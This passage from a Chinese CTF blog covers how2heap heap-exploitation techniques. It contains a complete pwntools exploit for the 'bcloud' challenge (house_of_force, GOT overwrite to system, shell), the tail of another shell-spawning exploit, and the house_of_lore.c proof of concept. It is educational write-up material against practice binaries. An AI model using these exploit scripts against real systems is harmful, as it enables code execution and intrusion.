class="line">log.info(hex(req[<span class="number">0</span>]))</span><br><span class="line">p.sendline(hex(req[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x08048D40')</span></span><br><span class="line">main_choice(<span class="string">'a'</span>)</span><br><span class="line">Ing_choice(<span class="string">'n'</span>)</span><br><span class="line">free  =<span class="number">0x1ec180</span></span><br><span class="line">memcpy=<span class="number">0x77610</span></span><br><span class="line">fgets =<span class="number">0x5e150</span></span><br><span class="line">alarm =<span class="number">0xb0270</span></span><br><span class="line">stk   =<span class="number">0</span></span><br><span class="line">malloc=<span class="number">0x1ec110</span></span><br><span class="line">puts  =<span class="number">0x5fca0</span></span><br><span class="line">g=<span class="number">0</span></span><br><span class="line">strtoul=<span class="number">0</span></span><br><span class="line">start=<span class="number">0</span></span><br><span class="line">buf=<span class="number">0</span></span><br><span class="line">system=<span class="number">0x3ada0</span></span><br><span class="line">calloc=<span class="number">0x1ec130</span></span><br><span class="line">Ing_choice(<span class="string">'g'</span>)</span><br><span class="line">name=p32(free+libc_base)+p32(memcpy+libc_base)+p32(fgets+libc_base)+p32(alarm+libc_base)+p32(stk)+p32(malloc+libc_base)+p32(puts+libc_base)+p32(g)+p32(strtoul)</span><br><span class="line">name+=p32(start)+p32(buf)+p32(system+libc_base)+p32(calloc+libc_base)</span><br><span class="line">name=name.ljust(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">name+=p32(<span class="number">0x1b25a0</span>+libc_base)</span><br><span class="line">name+=p32(<span class="number">0x1b2d60</span>+libc_base)</span><br><span class="line">p.sendline(name)</span><br><span class="line">Ing_choice(<span class="string">'s'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="bcloud"><a href="#bcloud" class="headerlink" title="bcloud"></a>bcloud</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>注：这个程序分析是在我写完题之后再来写的，可能会有很多东西会有剧透的既视感…主要是用来帮助自己以后看的</p>
<p>main就是很正常的菜单，就不多废话了，直接从其中做初始化的函数开始看</p>
<h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>0x0804899C:这个函数包括了两个函数，其中分别对应两个输入点</p>
<p>姑且称第一个是<code>input_name</code>，第二个是<code>input_org_host</code></p>
<h4 id="input-name"><a href="#input-name" class="headerlink" title="input_name"></a>input_name</h4><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582412657048.png" width="40%" height="40%">

<p>这里有一个比较坑的点我刚开始一直都没发现（当然还是自己太菜了），因为这个<code>readn_add0(ptr,n,chr)</code>是一个最多读取n个字符然后会在结尾处+0的函数，如果read过程中碰到chr就直接+0退出结束，也就是说如果我们输入了0x40个字符，他就会在0x41处补0。在这里，我们输入0x40之后他会把0补在V2这个变量处，随之被malloc的指针覆盖了，由于32位程序中指针都占4字节，所以覆盖之后这里直接连着堆指针一起strcpy进了chunk中，没有\x00截断。然后调用info输出了chunk中的内容</p>
<h4 id="input-org-host"><a href="#input-org-host" class="headerlink" title="input_org_host"></a>input_org_host</h4><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582413141212.png" width="60%" height="60%">

<p>上面的trick在这里同样出现了一遍，当然这里主要是<code>org v2 host</code>这三个连在了一起，最后在strcpy的时候是一个比较大的溢出，由于v2对应的chunk紧跟的就是top_chunk，所以很自然能联想到<code>house_of_force</code></p>
<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582413440952.png" width="60%" height="60%">

<p>根据下标和记录存放malloc的ptr，lenth由我们输入然后会被存到<code>len_Array</code>中，接着根据lenth读入conent，由于malloc时lenth+4，所以构成不了overflow</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582413618572.png" width="40%" height="40%">

<p>没什么好说的了，就是根据存的len来读数据</p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582413728779.png" alt="1582413728779"></p>
<p>先把ptr存在栈上，清空记录然后<code>free(ptr)</code></p>
<p>其他的函数都好像没什么用就不用管了</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>主要就是第二个初始化<code>input_org_host</code>中产生的<code>house_of_force</code>，先将top_chunk.size根据溢出赋值成<code>0xffffffff</code>，然后malloc一个负数设置<code>top_chunk</code>，之后再利用edit就好了，主要就是得发现<code>house_of_force</code>这个洞23333</p>
<p>接着就是在我们的ptr_Array上玩了，我设置的dest稍微在array上面一点，主要是当时免得出错，反正edit的时候可以打pad，当我们用设置好top之后，id0被占用，再新malloc出来用来写Array的chunk会放在index1，当然这个chunk我只写了一次，只用把对应的东西布置好就行了，具体布置什么见以下</p>
<p>由于我们最终的目的是要getshell，仅仅只有一个heap_base肯定是不行的，我们还需要leak一个libc的地址，这里我稍微想了一会，至于libc地址现在可以存在于三个地方：stack、got或者非fastbin链中的chunk。我最开始想的是：通过再malloc一个大一点的chunk之后free，然后在array上就有libc地址了，通过写一个array上的记录指向这个地址就可以打印，但是怎么打印呢，一般打印的方法有通过程序中有输出点的地方打印，或者通过栈溢出控制函数参数、返回地址到puts_plt这样打印，可是这个程序既没有打印chunk的函数…..也无法栈溢出或者泄露栈地址什么的，但是我想到能够设置一个GOT表然后调用edit修改，我们手上暂时又只有程序的地址可以用，所以我就找了一下有什么函数可以用来接受一个地址然后输出的（因为我们程序中使用Array中的数据而且调用到库函数的只有free），刚好有一个函数<code>0x08048779</code>，是接受一个地址然后打<code>%s</code>，这大概就是出题人故意设置的吧2333。所以把free的GOT改成这个函数就可以了，free的GOT表项后面是<code>__stack_chk_fail</code>，不会影响什么</p>
<p>不过我最开始的那个思路free一个大一点的chunk失败了，所以就转而想到了更简单的方法，利用GOT表</p>
<p>然后我们的Array上现在只需要有一样东西就行：GOT表地址。一个用来改free的GOT，一个用来leak</p>
<p>leak之后再把free的GOT改成system，然后malloc一个<code>/bin/sh\x00</code>的chunk，然后free就好了</p>
<p>好像也可以改atoi的GOT更方便一些（或者当修改GOT表影响了相邻表项会出错时可以试试）不过这里就不做多余的事了，getshell就行</p>
<h2 id="完整EXP-1"><a href="#完整EXP-1" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'bcloud'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(len,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'the note content:\n'</span>)</span><br><span class="line">	p.sendline(str(len))</span><br><span class="line">	p.recvuntil(<span class="string">'the content:\n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'the id:\n'</span>)</span><br><span class="line">	p.sendline(str(id))</span><br><span class="line">	p.recvuntil(<span class="string">'new content:\n'</span>)</span><br><span class="line">	loginfo(<span class="string">''</span>,<span class="number">0</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'the id:'</span>)</span><br><span class="line">	p.sendline(str(id))</span><br><span class="line">p.recvuntil(<span class="string">'your name:\n'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_base=my_u32(p.recv(<span class="number">4</span>))<span class="number">-0x8</span></span><br><span class="line">loginfo(<span class="string">'heap_base'</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Org:\n'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Host:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'\xff'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dest=<span class="number">0x0804B110</span></span><br><span class="line">old_top=heap_base+<span class="number">0xd8</span></span><br><span class="line">corrupt_size=dest-old_top<span class="number">-4</span>*<span class="number">4</span><span class="number">-4</span></span><br><span class="line"><span class="comment">#req = dest - old_top - 4*sizeof(long</span></span><br><span class="line">leakfunction=<span class="number">0x08048779</span></span><br><span class="line">free_got=<span class="number">0x0804B014</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x08048b4f'</span>)</span><br><span class="line">new(corrupt_size,<span class="string">'\n'</span>)<span class="comment">#set top</span></span><br><span class="line">new(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p32(<span class="number">0x0804B03C</span>)+p32(free_got)+<span class="string">'\n'</span>)<span class="comment">#id 0 1 atoi_got</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(leakfunction)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hey '</span>)</span><br><span class="line">libc_base=my_u32(p.recv(<span class="number">4</span>))<span class="number">-0x2d250</span></span><br><span class="line">loginfo(<span class="string">'libc base'</span>,libc_base)</span><br><span class="line">system=<span class="number">0x3ada0</span>+libc_base</span><br><span class="line">edit(<span class="number">1</span>,p32(system)+<span class="string">'\n'</span>)</span><br><span class="line">new(<span class="number">0x8</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/how2heap-house-of-lore-overlapping-chunks-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/17/how2heap-house-of-lore-overlapping-chunks-2/" class="post-title-link" itemprop="url">how2heap - house_of_lore&overlapping_chunks_2</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-17 22:42:21" itemprop="dateCreated datePublished" datetime="2020-02-17T22:42:21+08:00">2020-02-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:07:56" itemprop="dateModified" datetime="2020-02-29T18:07:56+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/17/how2heap-house-of-lore-overlapping-chunks-2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/17/how2heap-house-of-lore-overlapping-chunks-2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-house-of-lore-amp-overlapping-chunks-2"><a href="#how2heap-house-of-lore-amp-overlapping-chunks-2" class="headerlink" title="how2heap - house_of_lore&amp;overlapping_chunks_2"></a>how2heap - house_of_lore&amp;overlapping_chunks_2</h1><p>ubuntu16.04    libc2.23</p>
<p>这两个没有例题所以我放在一起了</p>
<h1 id="house-of-lore-c"><a href="#house-of-lore-c" class="headerlink" title="house_of_lore.c"></a>house_of_lore.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment">                  errstr = "malloc(): smallbin double linked list corrupted";</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">"Nice jump d00d"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说白了就是在栈上伪造出一个smallbin链里面的chunk来，然后把smallbin链中chunk的bk更改到栈上我们伪造的chunk处</p>
<p>这里在栈上伪造的chunk是这样的</p>
<table>
<thead>
<tr>
<th>header（fill 0）chunk1</th>
<th>header（fill 0）</th>
</tr>
</thead>
<tbody><tr>
<td>fd=victim</td>
<td>bk=chunk2</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>header（fill 0）chunk2</th>
<th>header（fill 0）</th>
</tr>
</thead>
<tbody><tr>
<td>fd = chunk1↑</td>
<td>#这里没必要，只检查fd</td>
</tr>
</tbody></table>
<p>这样，示例代码中连续两次通过vitcim-&gt;bk-&gt;fd的检查就可以把栈上的chunk1 malloc出来了，从而修改返回地址到shellcode</p>
